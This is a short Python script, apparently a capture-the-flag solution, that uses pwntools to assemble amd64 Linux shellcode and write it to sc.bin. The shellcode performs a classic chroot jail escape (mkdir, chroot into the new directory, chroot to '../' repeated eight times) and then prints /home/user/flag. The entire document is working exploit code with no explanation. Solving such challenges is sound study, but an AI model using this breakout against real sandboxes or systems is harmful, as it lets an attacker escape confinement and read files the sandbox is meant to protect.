from pwn import *

context.arch = 'amd64'

sc = ''
sc += shellcraft.amd64.linux.mkdir("a", 0o755)
sc += shellcraft.amd64.linux.chroot("a")
sc += shellcraft.amd64.linux.chroot("../" * 8)
sc += shellcraft.amd64.linux.cat("/home/user/flag")
sc += shellcraft.amd64.linux.exit(0x42)

with open('sc.bin', 'wb') as f:
    f.write(asm(sc))
